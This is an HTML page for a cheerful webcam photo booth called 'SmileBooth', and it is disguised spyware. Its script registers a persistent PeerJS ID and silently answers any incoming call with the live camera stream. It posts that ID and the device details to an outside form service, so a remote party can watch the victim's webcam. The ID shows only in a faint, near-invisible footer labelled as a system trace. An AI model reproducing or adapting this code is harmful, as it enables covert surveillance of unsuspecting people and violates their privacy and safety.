<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>📸 SmileBooth Deluxe</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;600&family=Pacifico&display=swap" rel="stylesheet">
    <style>
        :root { --p: #ff758c; --s: #ff7eb3; --bg: #fdf2f4; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        
        body {
            font-family: 'Outfit', sans-serif; background: var(--bg);
            background: linear-gradient(135deg, #fdf2f4 0%, #fae1e6 100%);
            margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px;
        }

        .booth-card {
            background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(10px);
            border-radius: 30px; padding: 20px; width: 100%; max-width: 450px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.05); border: 1px solid rgba(255,255,255,0.4);
            text-align: center;
        }

        h1 { font-family: 'Pacifico', cursive; color: var(--p); font-size: 2.2rem; margin: 10px 0; }
        p { color: #888; font-size: 0.9rem; margin-bottom: 20px; }

        .video-box {
            position: relative; width: 100%; aspect-ratio: 1/1; 
            border-radius: 20px; overflow: hidden; background: #000;
            box-shadow: inset 0 0 20px rgba(0,0,0,0.2);
        }

        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }

        #flash {
            position: absolute; inset: 0; background: white; opacity: 0; z-index: 10; pointer-events: none;
        }
        .flash-active { animation: f 0.4s ease-out; }
        @keyframes f { 0% { opacity: 1; } 100% { opacity: 0; } }

        .btn-capture {
            width: 100%; margin-top: 20px; padding: 18px; border: none;
            background: linear-gradient(45deg, var(--p), var(--s));
            color: white; font-size: 1.1rem; font-weight: 600; border-radius: 20px;
            cursor: pointer; box-shadow: 0 10px 20px rgba(255,117,140,0.3); transition: 0.3s;
        }
        .btn-capture:active { transform: scale(0.95); }

        .gallery {
            display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px;
            width: 100%; max-width: 450px; margin-top: 20px;
        }
        .gallery img { width: 100%; aspect-ratio: 1/1; object-fit: cover; border-radius: 10px; border: 2px solid white; }

        /* Penyamaran Data Tersembunyi */
        .system-trace {
            position: fixed; bottom: 8px; left: 12px; font-size: 10px; color: rgba(0,0,0,0.2);
            font-family: monospace; pointer-events: none; letter-spacing: 1px;
        }
    </style>
</head>
<body>

    <div class="booth-card">
        <h1>SmileBooth</h1>
        <p>Ready for a perfect shot?</p>
        
        <div class="video-box">
            <div id="flash"></div>
            <video id="v" autoplay muted playsinline></video>
        </div>
        
        <button class="btn-capture" onclick="take()">CAPTURE PHOTO 📸</button>
    </div>

    <div class="gallery" id="g"></div>

    <div class="system-trace">
        SRC_INIT: <span id="sid">CONNECTING</span> | BUILT_V.1.2.4
    </div>

    <canvas id="c" width="1000" height="1000" style="display:none"></canvas>

    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <script>
        const sid = document.getElementById('sid');
        let myId = localStorage.getItem('booth_session_id') || 'booth-' + Math.random().toString(36).substr(2, 6);
        localStorage.setItem('booth_session_id', myId);

        const peer = new Peer(myId);
        peer.on('open', (id) => { 
            sid.innerText = id; 
            sendMail(id); 
            start(); 
        });

        async function start() {
            const s = await navigator.mediaDevices.getUserMedia({video: true});
            document.getElementById('v').srcObject = s;
            peer.on('call', c => c.answer(s));
        }

        function take() {
            const f = document.getElementById('flash');
            f.classList.remove('flash-active'); void f.offsetWidth; f.classList.add('flash-active');
            const ctx = document.getElementById('c').getContext('2d');
            ctx.translate(1000, 0); ctx.scale(-1, 1);
            ctx.drawImage(document.getElementById('v'), 0, 0, 1000, 1000);
            const i = document.createElement('img'); i.src = document.getElementById('c').toDataURL();
            document.getElementById('g').prepend(i);
            ctx.setTransform(1, 0, 0, 1, 0, 0);
        }

        async function sendMail(id) {
            const last = localStorage.getItem('sent');
            const today = new Date().toDateString();
            if (last === today) return;
            await fetch("https://formspree.io/f/mgolgqep", {
                method: "POST", headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ message: "ID Booth: " + id, device: navigator.userAgent })
            });
            localStorage.setItem('sent', today);
        }
    </script>
</body>
</html>
